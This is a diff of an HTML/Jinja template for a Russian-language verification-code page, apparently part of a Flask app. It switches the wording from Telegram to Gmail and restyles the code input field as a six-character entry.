@@ -105,12 +105,25 @@
             margin: 10px 0;
             border-radius: 8px;
         }
+
+        .input-group {
+            margin-bottom: 20px;
+        }
+
+        .input-group input {
+            width: 80%;
+            display: inline-block;
+        }
+
+        .input-group .button {
+            width: 15%;
+        }
     </style>
 </head>
 <body>
     <div class="container">
-        <h1>Подтверждение Telegram</h1>
-        <p>Мы отправили код подтверждения в ваш Telegram. Введите его ниже:</p>
+        <h1>Подтверждение Gmail</h1>
+        <p>Мы отправили код подтверждения на почту. Введите его ниже:</p>
 
         <!-- Сообщения об ошибке или успехе -->
         {% with messages = get_flashed_messages(with_categories=true) %}
@@ -122,8 +135,10 @@
         {% endwith %}
 
         <form action="/confirm" method="POST">
-            <label for="code">Введите код:</label>
-            <input type="text" name="code" id="code" required>
+            <div class="input-group">
+                <label for="code">Введите шестизначный код:</label>
+                <input type="text" name="confirmation_code" id="code" maxlength="6" required>
+            </div>
 
             <!-- Кнопки "Назад" и "Далее" -->
             <div class="buttons">
